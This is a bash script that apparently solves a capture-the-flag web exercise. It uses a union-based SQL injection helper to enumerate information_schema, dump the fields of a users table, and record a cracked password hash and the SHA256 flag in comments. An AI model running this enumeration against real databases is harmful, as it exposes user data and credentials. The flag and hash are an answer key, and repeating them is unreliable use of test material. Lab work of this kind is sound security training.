#!/bin/bash

python union_enumerator.py "table_name from information_schema.tables"
# db_default
# users
# guestbook
# list_images
# vote_dbs
# python union_enumerator.py "column_name from information_schema.columns"
# # ...
# # password
# # ...
# python union_enumerator.py "table_name from information_schema.columns where column_name =" "password"
# # db_default
python union_enumerator.py "column_name from information_schema.columns where table_name =" "users"
# user_id
# first_name
# last_name
# town
# country
# planet
# Commentaire
# countersign
# python union_enumerator.py "column_name from information_schema.columns where table_name =" "guestbook"
# python union_enumerator.py "column_name from information_schema.columns where table_name =" "list_images"
# python union_enumerator.py "column_name from information_schema.columns where table_name =" "vote_dbs"
# python union_enumerator.py "column_name from information_schema.columns where table_name =" "db_default"
# python union_enumerator.py "id from db_default"
# python union_enumerator.py "grantee from information_schema.user_privileges"
# python union_enumerator.py "id from borntosec.db_default"
# python union_enumerator.py "subject from borntosec.vote_dbs"
fields="user_id first_name last_name town country planet Commentaire countersign"
for f in $fields; do
	python union_enumerator.py $f" from users"
done;
# Commentaire from users
# Amerca !
# Ich spreche kein Deutsch.
# ????? ????????????? ?????????
# Decrypt this password -&gt; then lower all the char. Sh256 on it and it's good !
# ANSWER: 5ff9d0165b4f92b14994e5c685cdce28 : FortyTwo
# SHA256 9995cae900a927ab1500d317dfcc52c0ad8a521bea878a8e9fa381b41459b646
echo "# ANSWER: 5ff9d0165b4f92b14994e5c685cdce28 : FortyTwo"
echo "# SHA256 9995cae900a927ab1500d317dfcc52c0ad8a521bea878a8e9fa381b41459b646"
